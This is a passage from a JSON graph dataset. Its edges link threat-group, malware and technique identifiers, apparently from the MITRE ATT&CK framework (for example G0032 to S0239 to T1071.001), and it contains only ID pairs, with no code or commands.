        },
        {
            "source": "S0241",
            "target": "T1007"
        },
        {
            "source": "G0032",
            "target": "S0241"
        },
        {
            "source": "S0239",
            "target": "T1071.001"
        },
        {
            "source": "S0239",
            "target": "T1001.003"
        },
        {
            "source": "S0239",
            "target": "T1132.002"
        },
        {
            "source": "S0239",
            "target": "T1571"
        },
        {
            "source": "S0239",
            "target": "T1059.003"
        },
        {
            "source": "S0239",
            "target": "T1087.002"
        },
        {
            "source": "S0239",
            "target": "T1087.001"
        },
        {
            "source": "S0239",
            "target": "T1134.002"
        },
        {
            "source": "S0239",
            "target": "T1070.006"
        },
        {
            "source": "S0239",
            "target": "T1070.004"
        },
        {
            "source": "S0239",
            "target": "T1543.003"
        },
        {
            "source": "S0239",
            "target": "T1203"
        },
        {
            "source": "S0239",
            "target": "T1140"
        },
        {
            "source": "S0239",
            "target": "T1119"
        },
        {
            "source": "S0239",
            "target": "T1112"
        },
        {
            "source": "S0239",
            "target": "T1106"
        },
        {
            "source": "S0239",
            "target": "T1105"
        },
        {
            "source": "S0239",
            "target": "T1083"
        },
        {
            "source": "S0239",
            "target": "T1082"
        },
        {
            "source": "S0239",
            "target": "T1070"
        },
        {
            "source": "S0239",
            "target": "T1065"
        },
        {
            "source": "S0239",
            "target": "T1057"
        },
        {
            "source": "S0239",
            "target": "T1041"
        },
        {
            "source": "S0239",
            "target": "T1012"
        },
        {
            "source": "S0239",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0239"
        },
        {
            "source": "S0271",
            "target": "T1573.001"
        },
        {
            "source": "S0271",
            "target": "T1059.003"
        },
        {
            "source": "S0271",
            "target": "T1070.004"
        },
        {
            "source": "S0271",
            "target": "T1113"
        },
        {
            "source": "S0271",
            "target": "T1112"
        },
        {
            "source": "S0271",
            "target": "T1105"
        },
        {
            "source": "S0271",
            "target": "T1083"
        },
        {
            "source": "S0271",
            "target": "T1082"
        },
        {
            "source": "S0271",
            "target": "T1057"
        },
        {
            "source": "S0271",
            "target": "T1043"
        },
        {
            "source": "S0271",
            "target": "T1016"
        },
        {
            "source": "G0032",
            "target": "S0271"
        },
        {
            "source": "S0238",
            "target": "T1071.001"
        },
        {
            "source": "S0238",
            "target": "T1569.002"
        },
        {
            "source": "S0238",
            "target": "T1059.003"
        },
        {
            "source": "S0238",
            "target": "T1070.004"
        },
        {
            "source": "S0238",
            "target": "T1485"
        },
        {
            "source": "S0238",
            "target": "T1124"
        },
        {
            "source": "S0238",
            "target": "T1119"
        },
        {
            "source": "S0238",
            "target": "T1083"
        },
        {
            "source": "S0238",
            "target": "T1082"
        },
        {
            "source": "S0238",
            "target": "T1057"
        },
        {
            "source": "S0238",
            "target": "T1043"
        },
        {
            "source": "S0238",
            "target": "T1041"
        },
        {
            "source": "S0238",
            "target": "T1016"
        },
        {
            "source": "S0238",
            "target": "T1012"
        },
        {
            "source": "S0238",
            "target": "T1005"
        },
        {
            "source": "G0032",
            "target": "S0238"
        },
        {
            "source": "S0263",
            "target": "T1571"
        },
        {
            "source": "S0263",
            "target": "T1204.002"
        },
        {
            "source": "S0263",
            "target": "T1059.005"
        },
        {
            "source": "S0263",
            "target": "T1059.003"
        },
        {
            "source": "S0263",
            "target": "T1562.004"
        },
        {
            "source": "S0263",
            "target": "T1070.004"
        },
        {
            "source": "S0263",
            "target": "T1543.003"
        },
        {
            "source": "S0263",
            "target": "T1140"
        },
        {
            "source": "S0263",
            "target": "T1112"
        },
        {
            "source": "S0263",
            "target": "T1105"
        },
        {
            "source": "S0263",
            "target": "T1094"
        },
        {
            "source": "S0263",
            "target": "T1090"
        },
        {
            "source": "S0263",
            "target": "T1083"
        },
        {
            "source": "S0263",
            "target": "T1082"
        },
        {
            "source": "S0263",
            "target": "T1065"
        },
        {
            "source": "S0263",
            "target": "T1043"
        },
        {
            "source": "S0263",
            "target": "T1027"
        },
        {
            "source": "G0032",
            "target": "S0263"
        },
        {
            "source": "S0180",
            "target": "T1573.002"
        },
        {
            "source": "S0180",
            "target": "T1573.001"
        },
        {
            "source": "S0180",
            "target": "T1059.003"
        },
        {
            "source": "S0180",
            "target": "T1036.004"
        },
        {
            "source": "S0180",
            "target": "T1070.004"
        },
        {
            "source": "S0180",
            "target": "T1543.003"
        },
        {
            "source": "S0180",
            "target": "T1140"
        },
        {
            "source": "S0180",
            "target": "T1112"
        },
        {
            "source": "S0180",
            "target": "T1106"
        },
        {
            "source": "S0180",
            "target": "T1105"
        },
        {
            "source": "S0180",
            "target": "T1094"
        },
        {
            "source": "S0180",
            "target": "T1083"
        },
        {
            "source": "S0180",
            "target": "T1082"
        },
        {
            "source": "S0180",
            "target": "T1065"
        },
        {
            "source": "S0180",
            "target": "T1057"
        },
        {
            "source": "S0180",
            "target": "T1049"
        },
        {
            "source": "S0180",
            "target": "T1043"
        },
        {
            "source": "S0180",
            "target": "T1027"
        },
        {
            "source": "S0180",
            "target": "T1016"
        },
        {
            "source": "S0180",
            "target": "T1012"
        },
        {
            "source": "S0180",
            "target": "T1007"
        },
        {
            "source": "G0032",
            "target": "S0180"
        },
        {
            "source": "S0181",
            "target": "T1573.001"
        },
        {
            "source": "S0181",
            "target": "T1001.003"
        },
        {
            "source": "S0181",
            "target": "T1070.006"
        },
        {
            "source": "S0181",
            "target": "T1070.004"
        },
        {
            "source": "S0181",
            "target": "T1543.003"
        },
        {
            "source": "S0181",
            "target": "T1083"
        },
        {
            "source": "S0181",
            "target": "T1082"
        },
        {
            "source": "S0181",
            "target": "T1016"
        },
        {
            "source": "G0032",
            "target": "S0181"
        },
        {
            "source": "G0032",
            "target": "S0108"
        },
        {
            "source": "G0032",
            "target": "S0002"
        },
        {
            "source": "G0032",
            "target": "S0366"
        },
        {
            "source": "S0086",
            "target": "T1071.001"
        },
        {
            "source": "S0086",
            "target": "T1059.003"
        },
        {
            "source": "S0086",
            "target": "T1560.002"
        },
        {
            "source": "S0086",
            "target": "T1036.005"
        },
        {
            "source": "S0086",
            "target": "T1543.003"
        },
        {
            "source": "S0086",
            "target": "T1113"
        },
        {
            "source": "S0086",
            "target": "T1105"
        },
        {
            "source": "S0086",
            "target": "T1083"
        },
        {
            "source": "S0086",
            "target": "T1082"
        },
        {
            "source": "S0086",
            "target": "T1007"
        },
        {
            "source": "G0031",
            "target": "S0086"
        },
        {
            "source": "S0085",
            "target": "T1071.001"
        },
        {
            "source": "S0085",
            "target": "T1132.001"
        },
        {
            "source": "S0085",
            "target": "T1087.001"
        },
        {
            "source": "S0085",
            "target": "T1036.005"
        },
        {
            "source": "S0085",
            "target": "T1136.001"
        },
        {
            "source": "S0085",
            "target": "T1547.009"
        },
        {
            "source": "S0085",
            "target": "T1547.001"
        },
        {
            "source": "S0085",
            "target": "T1082"
        },
        {
            "source": "S0085",
            "target": "T1043"
        },
        {
            "source": "S0085",
            "target": "T1008"
        },
        {
            "source": "S0085",
            "target": "T1007"
        },
        {
            "source": "G0031",
            "target": "S0085"
        },
        {
            "source": "S0084",
            "target": "T1071.001"
        },
        {
            "source": "S0084",
            "target": "T1132.001"
        },
        {
            "source": "S0084",
            "target": "T1059.003"
        },
        {
            "source": "S0084",
            "target": "T1087.001"
        },
        {
            "source": "S0084",
            "target": "T1036.005"
        },
        {
            "source": "S0084",
            "target": "T1136.001"
        },
        {
            "source": "S0084",
            "target": "T1095"
        },
        {
            "source": "S0084",
            "target": "T1094"
        },
        {
            "source": "S0084",
            "target": "T1082"
        },
        {
            "source": "S0084",
            "target": "T1043"
        },
        {
            "source": "S0084",
            "target": "T1033"
        },
        {
            "source": "S0084",
            "target": "T1016"
        },
        {
            "source": "S0084",
            "target": "T1008"
        },
        {
            "source": "G0031",
            "target": "S0084"
        },
        {
            "source": "S0083",
            "target": "T1132.001"
        },
        {
            "source": "S0083",
            "target": "T1059.003"
        },
        {
            "source": "S0083",
            "target": "T1036.005"
        },
        {
            "source": "S0083",
            "target": "T1070.006"
        },
        {
            "source": "S0083",
            "target": "T1070.004"
        },
        {
            "source": "S0083",
            "target": "T1105"
        },
        {
            "source": "S0083",
            "target": "T1095"
        },
        {
            "source": "S0083",
            "target": "T1094"
        },
        {
            "source": "S0083",
            "target": "T1083"
        },
        {
            "source": "S0083",
            "target": "T1082"
        },
        {
            "source": "S0083",
            "target": "T1070"
        },
        {
            "source": "S0083",
            "target": "T1043"
        },
        {
            "source": "G0031",
            "target": "S0083"
        },
        {
            "source": "S0082",
            "target": "T1573.001"
        },
        {
            "source": "S0082",
            "target": "T1071.001"
        },
        {
            "source": "S0082",
            "target": "T1069.001"
        },
        {
            "source": "S0082",
            "target": "T1059.003"
        },
        {
            "source": "S0082",
            "target": "T1027.001"
        },
        {
            "source": "S0082",
            "target": "T1547.001"
        },
        {
            "source": "S0082",
            "target": "T1218.011"
        },
        {
            "source": "S0082",
            "target": "T1543.003"
        },
        {
            "source": "S0082",
            "target": "T1055.001"
        },
        {
            "source": "S0082",
            "target": "T1105"
        },
        {
            "source": "S0082",
            "target": "T1082"
        },
        {
            "source": "S0082",
            "target": "T1027"
        },
        {
            "source": "S0082",
            "target": "T1016"
        },
        {
            "source": "S0082",
            "target": "T1007"
        },
        {
            "source": "G0030",
            "target": "S0082"
        },
        {
            "source": "S0081",
            "target": "T1573.001"
        },
        {
            "source": "S0081",
            "target": "T1071.001"
        },
        {
            "source": "S0081",
            "target": "T1132.001"
        },
        {
            "source": "S0081",
            "target": "T1074.001"
        },
        {
            "source": "S0081",
            "target": "T1087.001"
        },
        {
            "source": "S0081",
            "target": "T1036.005"
        },
        {
            "source": "S0081",
            "target": "T1070.006"
        },
        {
            "source": "S0081",
            "target": "T1070.004"
        },
        {
            "source": "S0081",
            "target": "T1547.001"
        },
        {
            "source": "S0081",
            "target": "T1218.011"
        },
        {
            "source": "S0081",
            "target": "T1543.003"
        },
        {
            "source": "S0081",
            "target": "T1055.001"
        },
        {
            "source": "S0081",
            "target": "T1105"
        },
        {
            "source": "S0081",
            "target": "T1083"
        },
        {
            "source": "S0081",
            "target": "T1082"
        },
        {
            "source": "S0081",
            "target": "T1057"
        },
        {
            "source": "S0081",
            "target": "T1027"
        },
        {
            "source": "S0081",
            "target": "T1016"
        },
        {
            "source": "S0081",
            "target": "T1007"
        },
        {
            "source": "G0030",
            "target": "S0081"
        },
        {
            "source": "S0079",
            "target": "T1217"
        },
        {
            "source": "S0079",
            "target": "T1105"
        },
        {
            "source": "S0079",
            "target": "T1083"
        },
        {
            "source": "S0079",
            "target": "T1082"
        },
        {
            "source": "S0079",
            "target": "T1065"
        },
        {
            "source": "S0079",
            "target": "T1057"
        },
        {
            "source": "S0079",
            "target": "T1041"
        },
        {
            "source": "S0079",
            "target": "T1032"
        },
        {
            "source": "S0079",
            "target": "T1005"
        },
        {
            "source": "G0029",
            "target": "S0079"
        },
        {
            "source": "S0078",
            "target": "T1071.001"
        },
        {
            "source": "S0078",
            "target": "T1070.006"
        },
        {
            "source": "S0078",
            "target": "T1105"
        },
        {
            "source": "S0078",
            "target": "T1083"
        },
        {
            "source": "S0078",
            "target": "T1041"
        },
        {
            "source": "G0029",
            "target": "S0078"
        },
        {
            "source": "S0077",
            "target": "T1573.001"
        },
        {
            "source": "S0077",
            "target": "T1059.004"
        },
        {
            "source": "S0077",
            "target": "T1105"
        },
        {
            "source": "S0077",
            "target": "T1041"
        },
        {
            "source": "G0029",
            "target": "S0077"
        },
        {
            "source": "S0076",
            "target": "T1573.001"
        },
        {
            "source": "S0076",
            "target": "T1001.003"
        },
        {
            "source": "S0076",
            "target": "T1056.001"
        },
        {
            "source": "S0076",
            "target": "T1095"
        },
        {
            "source": "G0029",
            "target": "S0076"
        },
        {
            "source": "G0028",
            "target": "S0039"
        },
        {
            "source": "G0028",
            "target": "S0029"
        },
        {
            "source": "G0027",
            "target": "S0590"
        },
        {
            "source": "G0027",
            "target": "S0412"
        },
        {
            "source": "S0398",
            "target": "T1071.001"
        },
        {
            "source": "S0398",
            "target": "T1574.002"
        },
        {
            "source": "S0398",
            "target": "T1569.002"
        },
        {
            "source": "S0398",
            "target": "T1070.004"
        },
        {
            "source": "S0398",
            "target": "T1113"
        },
        {
            "source": "S0398",
            "target": "T1106"
        },
        {
            "source": "S0398",
            "target": "T1105"
        },
        {
            "source": "S0398",
            "target": "T1055"
        },
        {
            "source": "S0398",
            "target": "T1007"
        },
        {
            "source": "G0027",
            "target": "S0398"
        },
        {
            "source": "G0027",
            "target": "S0357"
        },
        {
            "source": "G0027",
            "target": "S0100"
        },
        {
            "source": "G0027",
            "target": "S0073"
        },
        {
            "source": "S0072",
            "target": "T1071.001"
        },
        {
            "source": "S0072",
            "target": "T1574.002"
        },
        {
            "source": "S0072",
            "target": "T1560.003"
        },
        {
            "source": "S0072",
            "target": "T1056.001"
        },
        {
            "source": "S0072",
            "target": "T1036.005"
        },
        {
            "source": "S0072",
            "target": "T1070.006"
        },
        {
            "source": "S0072",
            "target": "T1505.003"
        },
        {
            "source": "S0072",
            "target": "T1083"
        },
        {
            "source": "G0027",
            "target": "S0072"
        },
        {
            "source": "S0070",
            "target": "T1071.004"
        },
        {
            "source": "S0070",
            "target": "T1071.001"
        },
        {
            "source": "S0070",
            "target": "T1574.002"
        },
        {
            "source": "S0070",
            "target": "T1574.001"
        },
        {
            "source": "S0070",
            "target": "T1059.003"
        },
        {
            "source": "S0070",
            "target": "T1056.001"
        },
        {
            "source": "S0070",
            "target": "T1036.005"
        },
        {
            "source": "S0070",
            "target": "T1070.004"
        },
        {
            "source": "S0070",
            "target": "T1547.001"
        },
        {
            "source": "S0070",
            "target": "T1105"
        },
        {
            "source": "S0070",
            "target": "T1083"
        },
        {
            "source": "S0070",
            "target": "T1043"
        },
        {
            "source": "S0070",
            "target": "T1027"
        },
        {
            "source": "G0027",
            "target": "S0070"
        },
        {
            "source": "G0027",
            "target": "S0039"
        },
        {
            "source": "G0027",
            "target": "S0032"
        },
        {
            "source": "G0027",
            "target": "S0020"
        },
        {
            "source": "G0027",
            "target": "S0013"
        },
        {
            "source": "G0027",
            "target": "S0008"
        },
        {
            "source": "G0027",
            "target": "S0006"
        },
        {
            "source": "G0027",
            "target": "S0005"
        },
        {
            "source": "G0027",
            "target": "S0002"
        },
        {
            "source": "S0124",
            "target": "T1071.004"
        },
        {
            "source": "S0124",
            "target": "T1132.001"
        },
        {
            "source": "S0124",
            "target": "T1059.003"
        },
        {
            "source": "S0124",
            "target": "T1547.001"
        },
        {
            "source": "S0124",
            "target": "T1105"
        },
        {
            "source": "S0124",
            "target": "T1083"
        },
        {
            "source": "S0124",
            "target": "T1082"
        },
        {
            "source": "S0124",
            "target": "T1027"
        },
        {
            "source": "S0124",
            "target": "T1016"
        },
        {
            "source": "G0026",
            "target": "S0124"
        },
        {
            "source": "G0026",
            "target": "S0106"
        },
        {
            "source": "S0071",
            "target": "T1059.003"
        },
        {
            "source": "S0071",
            "target": "T1543.003"
        },
        {
            "source": "G0026",
            "target": "S0071"
        },
        {
            "source": "G0026",
            "target": "S0070"
        },
        {
            "source": "G0026",
            "target": "S0032"
        },
        {
            "source": "G0025",
            "target": "S0069"
        },
        {
            "source": "S0068",
            "target": "T1573.001"
        },
        {
            "source": "S0068",
            "target": "T1071.001"
        },
        {
            "source": "S0068",
            "target": "T1059.003"
        },
        {
            "source": "G0024",
            "target": "S0068"
        },
        {
            "source": "S0067",
            "target": "T1071.001"
        },
        {
            "source": "S0067",
            "target": "T1552.001"
        },
        {
            "source": "S0067",
            "target": "T1070.004"
        },
        {
            "source": "G0024",
            "target": "S0067"
        },
        {
            "source": "S0066",
            "target": "T1573.001"
        },
        {
            "source": "S0066",
            "target": "T1071.001"
        },
        {
            "source": "S0066",
            "target": "T1070.006"
        },
        {
            "source": "S0066",
            "target": "T1083"
        },
        {
            "source": "G0024",
            "target": "S0066"
        },
        {
            "source": "S0065",
            "target": "T1573.001"
        },
        {
            "source": "S0065",
            "target": "T1071.001"
        },
        {
            "source": "S0065",
            "target": "T1059.003"
        },
        {
            "source": "S0065",
            "target": "T1083"
        },
        {
            "source": "S0065",
            "target": "T1082"
        },
        {
            "source": "S0065",
            "target": "T1057"
        },
        {
            "source": "G0024",
            "target": "S0065"
        },
        {
            "source": "S0064",
            "target": "T1071.001"
        },
        {
            "source": "S0064",
            "target": "T1083"
        },
        {
            "source": "S0064",
            "target": "T1057"
        },
        {
            "source": "S0064",
            "target": "T1043"
        },
        {
            "source": "G0023",
            "target": "S0064"
        },
        {
            "source": "G0022",
            "target": "S0349"
        },
        {
            "source": "S0165",
            "target": "T1069.001"
        },
        {
            "source": "S0165",
            "target": "T1069.002"
        },
        {
            "source": "S0165",
            "target": "T1087.002"
        },
        {
            "source": "S0165",
            "target": "T1087.001"
        },
        {
            "source": "S0165",
            "target": "T1135"
        },
        {
            "source": "S0165",
            "target": "T1082"
        },
        {
            "source": "S0165",
            "target": "T1049"
        },
        {
            "source": "S0165",
            "target": "T1018"
        },
        {
            "source": "S0165",
            "target": "T1016"
        },
        {
            "source": "S0165",
            "target": "T1012"
        },
        {
            "source": "G0022",
            "target": "S0165"
        },
        {
            "source": "S0166",
            "target": "T1569.002"
        },
        {
            "source": "S0166",
            "target": "T1053.005"
        },
        {
            "source": "S0166",
            "target": "T1105"
        },
        {
            "source": "G0022",
            "target": "S0166"
        },
        {
            "source": "G0022",
            "target": "S0111"
        },
        {
            "source": "S0063",
            "target": "T1087.001"
        },
        {
            "source": "S0063",
            "target": "T1083"
        },
        {
            "source": "S0063",
            "target": "T1057"
        },
        {
            "source": "S0063",
            "target": "T1049"
        },
        {
            "source": "S0063",
            "target": "T1027"
        },
        {
            "source": "S0063",
            "target": "T1018"
        },
        {
            "source": "G0022",
            "target": "S0063"
        },
        {
            "source": "G0022",
            "target": "S0013"
        },
        {
            "source": "S0553",
            "target": "T1059.003"
        },
        {
            "source": "S0553",
            "target": "T1059.001"
        },
        {
            "source": "S0553",
            "target": "T1518.001"
        },
        {
            "source": "S0553",
            "target": "T1547.001"
        },
        {
            "source": "S0553",
            "target": "T1105"
        },
        {
            "source": "S0553",
            "target": "T1082"
        },
        {
            "source": "S0553",
            "target": "T1047"
        },
        {
            "source": "G0021",
            "target": "S0553"
        },
        {
            "source": "S0547",
            "target": "T1059.006"
        },
        {
            "source": "S0547",
            "target": "T1059.003"
        },
        {
            "source": "S0547",
            "target": "T1567"
        },
        {
            "source": "S0547",
            "target": "T1140"
        },
        {
            "source": "S0547",
            "target": "T1105"
        },
        {
            "source": "S0547",
            "target": "T1102"
        },
        {
            "source": "S0547",
            "target": "T1083"
        },
        {
            "source": "S0547",
            "target": "T1082"
        },
        {
            "source": "G0021",
            "target": "S0547"
        },
        {
            "source": "S0546",
            "target": "T1059.003"
        },
        {
            "source": "S0546",
            "target": "T1059.001"
        },
        {
            "source": "S0546",
            "target": "T1547.001"
        },
        {
            "source": "S0546",
            "target": "T1053.005"
        },
        {
            "source": "S0546",
            "target": "T1140"
        },
        {
            "source": "S0546",
            "target": "T1113"
        },
        {
            "source": "S0546",
            "target": "T1105"
        },
        {
            "source": "S0546",
            "target": "T1102"
        },
        {
            "source": "S0546",
            "target": "T1082"
        },
        {
            "source": "S0546",
            "target": "T1047"
        },
        {
            "source": "G0021",
            "target": "S0546"
        },
        {
            "source": "S0543",
            "target": "T1071.001"
        },
        {
            "source": "S0543",
            "target": "T1132.001"
        },
        {
            "source": "S0543",
            "target": "T1059.003"
        },
        {
            "source": "S0543",
            "target": "T1497.002"
        },
        {
            "source": "S0543",
            "target": "T1027.002"
        },
        {
            "source": "S0543",
            "target": "T1140"
        },
        {
            "source": "S0543",
            "target": "T1082"
        },
        {
            "source": "S0543",
            "target": "T1041"
        },
        {
            "source": "S0543",
            "target": "T1033"
        },
        {
            "source": "G0021",
            "target": "S0543"
        },
        {
            "source": "S0062",
            "target": "T1071.001"
        },
        {
            "source": "S0062",
            "target": "T1074.001"
        },
        {
            "source": "S0062",
            "target": "T1570"
        },
        {
            "source": "S0062",
            "target": "T1518.001"
        },
        {
            "source": "S0062",
            "target": "T1560.001"
        },
        {
            "source": "S0062",
            "target": "T1056.001"
        },
        {
            "source": "S0062",
            "target": "T1070.004"
        },
        {
            "source": "S0062",
            "target": "T1547.001"
        },
        {
            "source": "S0062",
            "target": "T1518"
        },
        {
            "source": "S0062",
            "target": "T1120"
        },
        {
            "source": "S0062",
            "target": "T1113"
        },
        {
            "source": "S0062",
            "target": "T1091"
        },
        {
            "source": "S0062",
            "target": "T1083"
        },
        {
            "source": "S0062",
            "target": "T1082"
        },
        {
            "source": "S0062",
            "target": "T1057"
        },
        {
            "source": "S0062",
            "target": "T1047"
        },
        {
            "source": "S0062",
            "target": "T1041"
        },
        {
            "source": "S0062",
            "target": "T1027"
        },
        {
            "source": "S0062",
            "target": "T1008"
        },
        {
            "source": "G0021",
            "target": "S0062"
        },
        {
            "source": "G0021",
            "target": "S0012"
        },
        {
            "source": "S0456",
            "target": "T1071.001"
        },
        {
            "source": "S0456",
            "target": "T1568.002"
        },
        {
            "source": "S0456",
            "target": "T1560"
        },
        {
            "source": "S0456",
            "target": "T1134.002"
        },
        {
            "source": "S0456",
            "target": "T1134.001"
        },
        {
            "source": "S0456",
            "target": "T1070.004"
        },
        {
            "source": "S0456",
            "target": "T1547.001"
        },
        {
            "source": "S0456",
            "target": "T1055.001"
        },
        {
            "source": "S0456",
            "target": "T1140"
        },
        {
            "source": "S0456",
            "target": "T1113"
        },
        {
            "source": "S0456",
            "target": "T1106"
        },
        {
            "source": "S0456",
            "target": "T1105"
        },
        {
            "source": "S0456",
            "target": "T1095"
        },
        {
            "source": "S0456",
            "target": "T1090"
        },
        {
            "source": "S0456",
            "target": "T1083"
        },
        {
            "source": "S0456",
            "target": "T1082"
        },
        {
            "source": "S0456",
            "target": "T1057"
        },
        {
            "source": "S0456",
            "target": "T1049"
        },
        {
            "source": "S0456",
            "target": "T1033"
        },
        {
            "source": "S0456",
            "target": "T1027"
        },
        {
            "source": "S0456",
            "target": "T1025"
        },
        {
            "source": "S0456",
            "target": "T1016"
        },
        {
            "source": "S0456",
            "target": "T1010"
        },
        {
            "source": "G0019",
            "target": "S0456"
        },
        {
            "source": "G0019",
            "target": "S0108"
        },
        {
            "source": "G0019",
            "target": "S0097"
        },
        {
            "source": "G0019",
            "target": "S0096"
        },
        {
            "source": "G0019",
            "target": "S0095"
        },
        {
            "source": "S0061",
            "target": "T1562.001"
        },
        {
            "source": "S0061",
            "target": "T1046"
        },
        {
            "source": "G0019",
            "target": "S0061"
        },
        {
            "source": "S0060",
            "target": "T1573.001"
        },
        {
            "source": "S0060",
            "target": "T1071.001"
        },
        {
            "source": "S0060",
            "target": "T1069.001"
        },
        {
            "source": "S0060",
            "target": "T1082"
        },
        {
            "source": "S0060",
            "target": "T1033"
        },
        {
            "source": "S0060",
            "target": "T1016"
        },
        {
            "source": "G0019",
            "target": "S0060"
        },
        {
            "source": "S0059",
            "target": "T1071.001"
        },
        {
            "source": "S0059",
            "target": "T1083"
        },
        {
            "source": "S0059",
            "target": "T1082"
        },
        {
            "source": "S0059",
            "target": "T1057"
        },
        {
            "source": "S0059",
            "target": "T1033"
        },
        {
            "source": "S0059",
            "target": "T1008"
        },
        {
            "source": "G0019",
            "target": "S0059"
        },
        {
            "source": "S0058",
            "target": "T1562.001"
        },
        {
            "source": "S0058",
            "target": "T1056.001"
        },
        {
            "source": "S0058",
            "target": "T1036.005"
        },
        {
            "source": "S0058",
            "target": "T1547.009"
        },
        {
            "source": "S0058",
            "target": "T1547.001"
        },
        {
            "source": "S0058",
            "target": "T1134"
        },
        {
            "source": "S0058",
            "target": "T1082"
        },
        {
            "source": "S0058",
            "target": "T1033"
        },
        {
            "source": "S0058",
            "target": "T1008"
        },
        {
            "source": "G0019",
            "target": "S0058"
        },
        {
            "source": "G0019",
            "target": "S0057"
        },
        {
            "source": "S0055",
            "target": "T1055.001"
        },
        {
            "source": "S0055",
            "target": "T1105"
        },
        {
            "source": "S0055",
            "target": "T1095"
        },
        {
            "source": "S0055",
            "target": "T1083"
        },
        {
            "source": "G0019",
            "target": "S0055"
        },
        {
            "source": "G0019",
            "target": "S0039"
        },
        {
            "source": "G0019",
            "target": "S0029"
        },
        {
            "source": "G0018",
            "target": "S0104"
        },
        {
            "source": "G0018",
            "target": "S0100"
        },
        {
            "source": "G0018",
            "target": "S0096"
        },
        {
            "source": "S0043",
            "target": "T1071.001"
        },
        {
            "source": "S0043",
            "target": "T1095"
        },
        {
            "source": "S0043",
            "target": "T1082"
        },
        {
            "source": "G0018",
            "target": "S0043"
        },
        {
            "source": "S0042",
            "target": "T1071.001"
        },
        {
            "source": "S0042",
            "target": "T1102.002"
        },
        {
            "source": "S0042",
            "target": "T1105"
        },
        {
            "source": "S0042",
            "target": "T1043"
        },
        {
            "source": "G0018",
            "target": "S0042"
        },
        {
            "source": "G0018",
            "target": "S0039"
        },
        {
            "source": "G0018",
            "target": "S0012"
        },
        {
            "source": "G0017",
            "target": "S0013"
        },
        {
            "source": "G0017",
            "target": "S0012"
        },
        {
            "source": "S0597",
            "target": "T1016.001"
        },
        {
            "source": "S0597",
            "target": "T1071.001"
        },
        {
            "source": "S0597",
            "target": "T1119"
        },
        {
            "source": "G0016",
            "target": "S0597"
        },
        {
            "source": "S0589",
            "target": "T1071.001"
        },
        {
            "source": "S0589",
            "target": "T1059.005"
        },
        {
            "source": "S0589",
            "target": "T1036.005"
        },
        {
            "source": "S0589",
            "target": "T1070.004"
        },
        {
            "source": "S0589",
            "target": "T1218.005"
        },
        {
            "source": "S0589",
            "target": "T1218.011"
        },
        {
            "source": "S0589",
            "target": "T1053.005"
        },
        {
            "source": "S0589",
            "target": "T1140"
        },
        {
            "source": "S0589",
            "target": "T1112"
        },
        {
            "source": "S0589",
            "target": "T1105"
        },
        {
            "source": "S0589",
            "target": "T1102"
        },
        {
            "source": "S0589",
            "target": "T1070"
        },
        {
            "source": "S0589",
            "target": "T1049"
        },
        {
            "source": "S0589",
            "target": "T1047"
        },
        {
            "source": "S0589",
            "target": "T1027"
        },
        {
            "source": "S0589",
            "target": "T1016"
        },
        {
            "source": "S0589",
            "target": "T1012"
        },
        {
            "source": "G0016",
            "target": "S0589"
        },
        {
            "source": "S0588",
            "target": "T1573.002"
        },
        {
            "source": "S0588",
            "target": "T1071.001"
        },
        {
            "source": "S0588",
            "target": "T1001.001"
        },
        {
            "source": "S0588",
            "target": "T1059.003"
        },
        {
            "source": "S0588",
            "target": "T1497.003"
        },
        {
            "source": "S0588",
            "target": "T1497.001"
        },
        {
            "source": "S0588",
            "target": "T1036.005"
        },
        {
            "source": "S0588",
            "target": "T1036.004"
        },
        {
            "source": "S0588",
            "target": "T1027.002"
        },
        {
            "source": "S0588",
            "target": "T1053.005"
        },
        {
            "source": "S0588",
            "target": "T1140"
        },
        {
            "source": "S0588",
            "target": "T1124"
        },
        {
            "source": "S0588",
            "target": "T1105"
        },
        {
            "source": "S0588",
            "target": "T1041"
        },
        {
            "source": "S0588",
            "target": "T1027"
        },
        {
            "source": "S0588",
            "target": "T1016"
        },
        {
            "source": "G0016",
            "target": "S0588"
        },
        {
            "source": "S0565",
            "target": "T1497.003"
        },
        {
            "source": "S0565",
            "target": "T1036.005"
        },
        {
            "source": "S0565",
            "target": "T1027.003"
        },
        {
            "source": "S0565",
            "target": "T1027.002"
        },
        {
            "source": "S0565",
            "target": "T1140"
        },
        {
            "source": "S0565",
            "target": "T1036"
        },
        {
            "source": "S0565",
            "target": "T1027"
        },
        {
            "source": "G0016",
            "target": "S0565"
        },
        {
            "source": "S0562",
            "target": "T1195.002"
        },
        {
            "source": "S0562",
            "target": "T1565.001"
        },
        {
            "source": "S0562",
            "target": "T1036.005"
        },
        {
            "source": "S0562",
            "target": "T1070.004"
        },
        {
            "source": "S0562",
            "target": "T1480"
        },
        {
            "source": "S0562",
            "target": "T1134"
        },
        {
            "source": "S0562",
            "target": "T1140"
        },
        {
            "source": "S0562",
            "target": "T1106"
        },
        {
            "source": "S0562",
            "target": "T1083"
        },
        {
            "source": "S0562",
            "target": "T1057"
        },
        {
            "source": "S0562",
            "target": "T1027"
        },
        {
            "source": "G0016",
            "target": "S0562"
        },
        {
            "source": "S0560",
            "target": "T1036.005"
        },
        {
            "source": "S0560",
            "target": "T1543.003"
        },
        {
            "source": "S0560",
            "target": "T1140"
        },
        {
            "source": "S0560",
            "target": "T1112"
        },
        {
            "source": "S0560",
            "target": "T1027"
        },
        {
            "source": "S0560",
            "target": "T1012"
        },
        {
            "source": "G0016",
            "target": "S0560"
        },
        {
            "source": "S0559",
            "target": "T1027.005"
        },
        {
            "source": "S0559",
            "target": "T1573.001"
        },
        {
            "source": "S0559",
            "target": "T1071.004"
        },
        {
            "source": "S0559",
            "target": "T1071.001"
        },
        {
            "source": "S0559",
            "target": "T1001.003"
        },
        {
            "source": "S0559",
            "target": "T1001.002"
        },
        {
            "source": "S0559",
            "target": "T1001.001"
        },
        {
            "source": "S0559",
            "target": "T1132.001"
        },
        {
            "source": "S0559",
            "target": "T1568"
        },
        {
            "source": "S0559",
            "target": "T1059.005"
        },
        {
            "source": "S0559",
            "target": "T1497.003"
        },
        {
            "source": "S0559",
            "target": "T1497.001"
        },
        {
            "source": "S0559",
            "target": "T1518.001"
        },
        {
            "source": "S0559",
            "target": "T1562.001"
        },
        {
            "source": "S0559",
            "target": "T1036.005"
        },
        {
            "source": "S0559",
            "target": "T1553.002"
        },
        {
            "source": "S0559",
            "target": "T1070.004"
        },
        {
            "source": "S0559",
            "target": "T1546.012"
        },
        {
            "source": "S0559",
            "target": "T1218.011"
        },
        {
            "source": "S0559",
            "target": "T1112"
        },
        {
            "source": "S0559",
            "target": "T1105"
        },
        {
            "source": "S0559",
